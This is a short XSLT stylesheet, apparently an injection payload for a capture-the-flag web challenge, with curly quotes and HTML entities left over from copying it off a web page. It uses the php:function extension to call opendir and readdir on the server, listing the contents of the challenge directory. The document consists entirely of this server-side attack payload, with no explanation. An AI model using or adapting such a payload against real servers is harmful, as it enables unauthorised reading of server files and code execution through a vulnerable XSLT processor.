<xsl:stylesheet version=”1.0″ xmlns:xsl=”http://www.w3.org/1999/XSL/Transform&#8221; xmlns:php=”http://php.net/xsl”&gt;
<xsl:template match=”/”>
<xsl:value-of select="php:function('opendir','/challenge/web-serveur/ch50/')"/>
<xsl:value-of select="php:function('readdir')"/>
</xsl:template>
</xsl:stylesheet>
